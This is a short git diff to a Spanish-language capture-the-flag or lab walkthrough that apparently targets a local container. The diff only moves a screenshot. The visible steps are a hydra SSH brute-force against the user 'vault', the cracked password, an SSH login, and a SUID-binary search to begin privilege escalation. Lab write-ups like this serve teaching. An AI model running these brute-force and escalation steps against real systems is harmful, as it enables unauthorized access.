@@ -65,9 +65,8 @@ Usamos hydra para hacer fuerza bruta al usuario ```vault``` con la wordlist que 
 ```
 hydra -l vault -P vaultpasswd ssh://172.17.0.2/
 ```
-![brute force](images/img6.png)
-
 vemos que la contraseña es ```Yk8$pZ5@cN4!```, por lo que accedemos al ssh con el usuario vault ```ssh vault@172.17.0.2```
+![ssh](images/img6.png)
 
 ## Paso N7: Escalando privilegios
 Una vez ya dentro del usuario ```vault``` buscamos Binarios SUID con ```find / -perm -4000 2>/dev/null```
